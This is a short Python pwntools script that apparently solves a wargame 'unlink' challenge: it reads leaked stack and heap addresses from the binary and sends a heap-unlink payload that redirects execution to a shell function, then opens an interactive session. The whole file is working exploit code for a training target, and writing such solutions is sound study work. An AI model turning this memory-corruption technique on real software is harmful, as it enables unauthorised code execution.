from pwn import *

s = process('/home/unlink/unlink')
e = ELF('/home/unlink/unlink')

shell = 0x80484eb

s.recvuntil('here is stack address leak: ')
a_stack_add = int(s.recv(10), 0)

s.recvuntil('here is heap address leak: ')
a_heap_add = int(s.recv(9), 0)

payload = p32(shell)
payload += 'BUFF' + 'PREV' + 'SIZE'
payload += p32(a_stack_add + 0xc)	#aim to ebp-4
payload += p32(a_heap_add + 0xc) 	#aim to a->buf

s.sendline(payload)

s.interactive()
